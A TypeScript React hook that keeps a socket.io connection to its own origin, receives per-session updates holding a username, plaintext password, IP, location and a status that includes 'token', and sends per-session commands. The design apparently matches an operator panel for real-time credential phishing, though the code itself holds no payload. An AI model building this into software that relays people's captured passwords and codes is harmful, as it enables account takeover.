import { useEffect, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';

export interface SessionData {
  sessionId: string;
  username: string;
  password: string;
  ip: string;
  location: string;
  status: 'idle' | 'waiting' | 'error' | 'token' | 'success';
  message?: string;
}

export const useWebSocket = () => {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [sessionData, setSessionData] = useState<SessionData | null>(null);
  const [isConnected, setIsConnected] = useState(false);

  useEffect(() => {
    const newSocket = io(window.location.origin, {
      transports: ['websocket', 'polling'],
    });

    newSocket.on('connect', () => {
      setIsConnected(true);
    });

    newSocket.on('disconnect', () => {
      setIsConnected(false);
    });

    newSocket.on('sessionUpdate', (data: SessionData) => {
      setSessionData(data);
    });

    setSocket(newSocket);

    return () => {
      newSocket.close();
    };
  }, []);

  const sendCommand = useCallback((command: string, sessionId: string) => {
    if (socket) {
      socket.emit('command', { command, sessionId });
    }
  }, [socket]);

  const updateClientData = useCallback((data: Partial<SessionData>) => {
    if (socket) {
      socket.emit('clientUpdate', data);
    }
  }, [socket]);

  return {
    socket,
    sessionData,
    isConnected,
    sendCommand,
    updateClientData,
  };
};
